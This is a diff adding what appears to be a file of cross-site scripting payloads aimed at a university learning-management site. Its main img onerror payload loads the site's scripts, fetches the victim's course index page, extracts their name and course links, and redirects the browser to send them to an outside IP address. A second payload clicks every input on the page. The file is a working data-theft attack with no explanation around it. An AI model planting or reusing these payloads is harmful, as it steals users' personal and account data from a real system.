@@ -1,0 +1,38 @@
+<img src=x onerror='
+  var url=`https://e3.nctu.edu.tw/NCTU_Easy_E3P/lms31/enter_course_index.aspx`;
+  var path=[`https://e3.nctu.edu.tw/NCTU_Easy_E3P/LMS31/WebResource.axd?d=LDvnB8eLAotFsch8qzA2LB11aWam-imRFDGWUmdyz7H4pZ-H8jiEy0r6ZDUVTr3FHW7a3zJq7HR--8Pt-yxLTGLTGSQ1&t=636650918320184522`,
+  `https://e3.nctu.edu.tw/NCTU_Easy_E3P/LMS31/WebResource.axd?d=CyN06PYUyLdd4m8JYq_Bp8kIZT9fhHz0vOdGzHzlF3e8fFZJM14iJuIDIj_J1j1oIpmNceyMciqbeHIbZpJrKvpiO_PYrLsgfi__83d1D0pPUa9uSGDoqtAZ33NdrZdFD7Y1ww2&t=636773577617679322`,
+  `https://e3.nctu.edu.tw/NCTU_Easy_E3P/LMS31/ScriptResource.axd?d=EOu9YRD5q78_sP89YGwtpZqcSPiYcrCPElW1r2o3SER6FlA2sCZL8-S4ZOHzQmRO3S_p1qwUQz9qsBQHwP8vP8OqZPoln0ro4hNGh-jZa_05V4PuQhqcJ29-8KkCRbMn3GtcPg2&t=633049125920000000`,
+  `https://e3.nctu.edu.tw/NCTU_Easy_E3P/LMS31/ScriptResource.axd?d=zQRXmiB5QLNYDRdbDTTlXT-C7S8-sLS5IL3jys-0GjqzWBYMYBUC9rj5SLTOSzhIwpDGwK6lxPBWVtVcMFtC5X5SEdPiZOvCnyHXhCNrNCPYmfzBL21x0EyZv4fZYM_h4tjQbw2&t=633049125920000000`,
+  `https://e3.nctu.edu.tw/NCTU_EASY_E3P/LMS31/js/jquery-1.3.1.js`,
+  `https://e3.nctu.edu.tw/NCTU_EASY_E3P/LMS31/js/jquery.timers.js`,
+  `https://e3.nctu.edu.tw/NCTU_EASY_E3P/LMS31/js/DoubleConfirm.js`
+  ];
+  for(var i=0; i<7; i++){
+    var d = document.createElement(`script`);
+    d.src = path[i];
+    document.getElementsByTagName(`body`)[0].appendChild(d);
+  }
+  var http=new XMLHttpRequest();
+  http.open(`GET`, url);
+  http.send();
+  http.onreadystatechange=(e)=>{
+    var data=http.responseText.split(`\n`);
+    var important;
+    var simply;
+    var name;
+    for(var i=0; i<data.length; i++){
+      if(data[i].indexOf(`ctl00_ContentPlaceHolder1_gvCourse_ct`)!=-1)important+=data[i]+`\n`;
+      if(data[i].indexOf(`ctl00_lbWelcomeT`)!=-1)name=data[i]+`\n`;
+    }
+    var importantData=important.split(`\n`);
+    for(var j=0; j<importantData.length; j++){
+      if(importantData[j].indexOf(`<a`)!=-1)simply+=importantData[j]+`\n`;
+    }
+    var all=name+simply+`\n`;
+    allEncode=encodeURI(all);
+    location.href=`http://140.113.68.170:3000?`+allEncode;
+  }
+'>
+
+<img src=x onerror=$(`input`).click()>
